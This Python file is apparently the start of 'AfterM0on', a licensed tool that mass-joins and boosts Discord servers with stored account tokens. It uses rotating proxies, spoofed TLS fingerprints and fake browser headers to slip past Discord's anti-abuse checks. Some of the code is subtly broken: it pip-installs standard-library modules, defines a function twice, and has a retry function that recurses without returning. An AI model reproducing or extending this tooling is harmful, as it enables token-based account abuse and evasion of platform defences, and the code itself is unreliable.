import os
try:
  import time
except ImportError:
  print("Installing time module...Please wait\n")
  os.system('python -m pip install time')
try:
  import json
except ImportError:
  print("Installing json module...Please wait\n")
  os.system('python -m pip install json')
try:
  import requests
except ImportError:
  print("Installing requests module...Please wait\n")
  os.system('python -m pip install requests')
try:
  import threading
except ImportError:
  print("Installing threading module...Please wait\n")
  os.system('python -m pip install threading')
try:
  import string
except ImportError:
  print("Installing string module...Please wait\n")
  os.system('python -m pip install string')
try:
  import random
except ImportError:
  print("Installing random module...Please wait\n")
  os.system('python -m pip install random')
try:
  import httpx
except ImportError:
  print("Installing httpx module...Please wait\n")
  os.system('python -m pip install httpx')
try:
  import tls_client
except ImportError:
  print("Installing tls_client module...Please wait\n")
  os.system('python -m pip install tls_client')
try:
  import sys
except ImportError:
  print("Installing sys module...Please wait\n")
  os.system('python -m pip install sys')
try:
  import urllib.request
except ImportError:
  print("Installing urllib.request module...Please wait\n")
  os.system('python -m pip install urllib.request')
try:
  import websocket
except ImportError:
  print("Installing websocket-client module...Please wait\n")
  os.system('python -m pip install websocket-client')
try:
  import re
except ImportError:
  print("Installing re module...Please wait\n")
  os.system('python -m pip install re')
try:
  import concurrent.futures
except ImportError:
  print("Installing concurrent.futures module...Please wait\n")
  os.system('python -m pip install concurrent.futures')
try:
  import colorama
except ImportError:
  print("Installing colorama module...Please wait\n")
  os.system('python -m pip install colorama')
try:
  import asyncio
except ImportError:
  print("Installing asyncio module...Please wait\n")
  os.system('python -m pip install asyncio')
try:
  import pathlib
except ImportError:
  print("Installing pathlib module...Please wait\n")
  os.system('python -m pip install pathlib')
try:
  import datetime
except ImportError:
  print("Installing datetime module...Please wait\n")
  os.system('python -m pip install datetime')
try:
  import threading
except ImportError:
  print("Installing threading module...Please wait\n")
  os.system('python -m pip install threading')
try:
  import pystyle
except ImportError:
  print("Installing pystyle module...Please wait\n")
  os.system('python -m pip install pystyle')

import datetime as dt
import time, json, threading, random, httpx, tls_client, sys, urllib.request, websocket, re
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Style
from pathlib import Path
from datetime import datetime
from threading import Thread
from random import randint
from pystyle import Center, Colors, Colorate, Box

class Fore:
    BLACK  = '\033[30m'
    RED    = '\033[31m'
    GREEN  = '\033[32m'
    YELLOW = '\033[33m'
    BLUE   = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN   = '\033[36m'
    WHITE  = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET  = '\033[0m'
    
def sinput(message, input_type, var):
    value = input(Colorate.Vertical(Colors.white, f"{message}", 1))
    try:
        return input_type(value)
    except:
        cls()
        print(f"{Colors.white}The {var} input must be a number")
        asker()
        return None

def cls():
    os.system('cls' if os.name =='nt' else 'clear')

config = json.load(open("config/config.json", encoding="utf-8"))
cls()

os.system(f"title AfterM0on - {datetime.now().strftime('%H:%M:%S')}")

if config['streamer_mode'] == True:
    ascii_react = f"""
                _     __ _            __  __  ___              
               / \   / _| |_ ___ _ __|  \/  |/ _ \  ___  _ __  
              / _ \ | |_| __/ _ \ '__| |\/| | | | |/ _ \| '_ \ 
             / ___ \|  _| ||  __/ |  | |  | | |_| | (_) | | | |
            /_/   \_\_|  \__\___|_|  |_|  |_|\___/ \___/|_| |_|
                     Support : discord.gg/WMJk6D38Xp                  
     > License                 : {config['license_key'][:9]} - Streamer Mode
     > Stockage(3Months)       : {len(open('config/token/3Months.txt', 'r').read().splitlines()) * 2}
     > Stockage(2Months)       : {len(open('config/token/2Months.txt', 'r').read().splitlines()) * 2}
     > Stockage(1Months)       : {len(open('config/token/1Months.txt', 'r').read().splitlines()) * 2}
     > Stockage(Token Joiner)  : {len(open('config/token/token_joiner.txt', 'r').read().splitlines())}
     > Stockage(Token Onliner) : {len(open('config/token/tokens_onliner.txt', 'r').read().splitlines())}
        """
else:
    ascii_react = f"""
                _     __ _            __  __  ___              
               / \   / _| |_ ___ _ __|  \/  |/ _ \  ___  _ __  
              / _ \ | |_| __/ _ \ '__| |\/| | | | |/ _ \| '_ \ 
             / ___ \|  _| ||  __/ |  | |  | | |_| | (_) | | | |
            /_/   \_\_|  \__\___|_|  |_|  |_|\___/ \___/|_| |_|
                     Support : discord.gg/WMJk6D38Xp                  
     > License                 : {config['license_key']}
     > Stockage(3Months)       : {len(open('config/token/3Months.txt', 'r').read().splitlines()) * 2}
     > Stockage(2Months)       : {len(open('config/token/2Months.txt', 'r').read().splitlines()) * 2}
     > Stockage(1Months)       : {len(open('config/token/1Months.txt', 'r').read().splitlines()) * 2}
     > Stockage(Token Joiner)  : {len(open('config/token/token_joiner.txt', 'r').read().splitlines())}
     > Stockage(Token Onliner) : {len(open('config/token/tokens_onliner.txt', 'r').read().splitlines())}
        """

print(Colorate.Vertical(Colors.blue_to_white, Center.XCenter(ascii_react)))
    
def validate():
    if True:
        f = open("config/logs/license/connected.txt", "a")
        f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> [License : {config['license_key']}] | You have successfully connected to the AfterM0on Tool thank you for your credit <3.")
        f.close()
        time.sleep(1)

def answer():
    try:
        key = input(Colorate.Vertical(Colors.white, f"> License key > ͏", 1))
        x = {"license_key": key}
        config.update(x)
        json.dump(config, open("config/config.json", "w"), indent = 4)

    except KeyboardInterrupt:
        os._exit(1)

if "license_key" not in str(config):
    answer()

validate()


client_identifiers = ['safari_ios_16_0', 'safari_ios_15_6', 'safari_ios_15_5', 'safari_16_0', 'safari_15_6_1', 'safari_15_3', 'opera_90', 'opera_89', 'firefox_104', 'firefox_102']

class variables:
    joins = 0; boosts_done = 0; success_tokens = []; failed_tokens = []


def timestamp(): 
    timestamp = Colorate.Vertical(Colors.white, datetime.now().strftime('%H:%M:%S'), 1)
    return timestamp


def sprint(message, type:bool):
    combined = f"{Fore.WHITE}{Fore.RESET}{Style.BRIGHT}{Fore.RED if type == False else Fore.GREEN}{message}{Fore.RESET}{Style.RESET_ALL}"
    print(combined)


def slprint(message, token, type:bool):
    if config['streamer_mode'] == True:
        combined = f"{Fore.RED if type == False else Fore.GREEN}[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> {message} | [Token : {token[:11]}]"
        print(combined)
    else:
        combined = f"{Fore.RED if type == False else Fore.GREEN}[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> {message} | [Token : {token}]"
        print(combined)

def fazdgazdazd(message, type:bool):
    if config['streamer_mode'] == True:
        combined = f"{Fore.RED if type == False else Fore.GREEN}[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> {message}"
        print(combined)
    else:
        combined = f"{Fore.RED if type == False else Fore.GREEN}[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> {message}"
        print(combined)


def sinput(message, input_type, var):
    value = input(Colorate.Vertical(Colors.white, f"{message}", 1))
    try:
        return input_type(value)
    except:
        cls()
        sprint(f"The {var} input must be a number", False)
        asker()
        return None
    
data = [{"ja3":"771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2","useragent":"Mozilla/5.0 (X11;  Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0","x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InB0LVBUIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOiIxNTQxODYiLCJjbGllbnRfZXZlbnRfc291cmNlIjoibnVsbCJ9"},{"ja3":"771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2","useragent":"Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4","x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRlbyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDYuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwNi4wLjAuMCIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoiMTU0MTg2IiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6Im51bGwifQ=="},{"ja3":"771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2","useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImFtIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOiIxNTQxODYiLCJjbGllbnRfZXZlbnRfc291cmNlIjoibnVsbCJ9"},{"ja3":"771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2","useragent":"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36","x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InF1IiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOiIxNTQxODYiLCJjbGllbnRfZXZlbnRfc291cmNlIjoibnVsbCJ9"},{"ja3":"771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2","useragent":"Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393","x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InNvIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOiIxNTQxODYiLCJjbGllbnRfZXZlbnRfc291cmNlIjoibnVsbCJ9"},{"ja3":"771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2","useragent":"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6Imdzdy1DSCIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDYuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwNi4wLjAuMCIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoiMTU0MTg2IiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6Im51bGwifQ=="},{"ja3":"771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2","useragent":"Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393","x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImlkIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOiIxNTQxODYiLCJjbGllbnRfZXZlbnRfc291cmNlIjoibnVsbCJ9"},{"ja3":"771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2","useragent":"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1500.55 Safari/537.36","x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImtpIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOiIxNTQxODYiLCJjbGllbnRfZXZlbnRfc291cmNlIjoibnVsbCJ9"},{"ja3":"771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2","useragent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36","x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InNhaCIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDYuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwNi4wLjAuMCIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoiMTU0MTg2IiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6Im51bGwifQ=="},{"ja3":"771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2","useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZvLUZPIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOiIxNTQxODYiLCJjbGllbnRfZXZlbnRfc291cmNlIjoibnVsbCJ9"},{"ja3":"771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2","useragent":"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14","x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZyLU1DIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOiIxNTQxODYiLCJjbGllbnRfZXZlbnRfc291cmNlIjoibnVsbCJ9"},{"ja3":"771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2","useragent":"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200","x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InZpIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOiIxNTQxODYiLCJjbGllbnRfZXZlbnRfc291cmNlIjoibnVsbCJ9"},{"ja3":"771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2","useragent":"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200","x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6Im1hcy1UWiIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDYuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwNi4wLjAuMCIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoiMTU0MTg2IiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6Im51bGwifQ=="}]
 

def checkEmpty(filename):
    mypath = Path(filename)
 
    if mypath.stat().st_size == 0:
        return True
    else:
        return False
    
    
def validateInvite(invite:str):
    client = httpx.Client()
    if 'type' in client.get(f'https://discord.com/api/v10/invites/{invite}?inputValue={invite}&with_counts=true&with_expiration=true').text:
        return True
    else:
        return False 


def get_all_tokens(filename:str): 
    all_tokens = []
    for j in open(filename, "r").read().splitlines():
        if ":" in j:
            j = j.split(":")[2]
            all_tokens.append(j)
        else:
            all_tokens.append(j)
 
    return all_tokens



def remove(token: str, filename:str):
    tokens = get_all_tokens(filename)
    tokens.pop(tokens.index(token))
    f = open(filename, "w")
    
    for l in tokens:
        f.write(f"{l}\n")
        
    f.close()
            
        
        
def getproxy():
    try:
        proxy = random.choice(open("config/proxies/proxies.txt", "r").read().splitlines())
        return {'http': f'{proxy}'}
    except Exception as e:
        pass
    
    
def get_fingerprint(thread):
    try:
        fingerprint = httpx.get(f"https://discord.com/api/v10/experiments", proxies =  {'http://': f'http://{random.choice(open("config/proxies/proxies.txt", "r").read().splitlines())}', 'https://': f'http://{random.choice(open("config/proxies/proxies.txt", "r").read().splitlines())}'} if config['proxyless'] != True else None)
        return fingerprint.json()['fingerprint']
    except Exception as e:
        get_fingerprint(thread)
        
def get_cookies(x, useragent, thread):
    try:
        response = httpx.get('https://discord.com/api/v10/experiments', headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','origin': 'https://discord.com','referer':'https://discord.com','sec-ch-ua': f'"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': useragent, 'x-debug-options': 'bugReporterEnabled','x-discord-locale': 'en-US','x-super-properties': x}, proxies = {'http://': f'http://{random.choice(open("config/proxies/proxies.txt", "r").read().splitlines())}', 'https://': f'http://{random.choice(open("config/proxies/proxies.txt", "r").read().splitlines())}'} if config['proxyless'] != True else None)
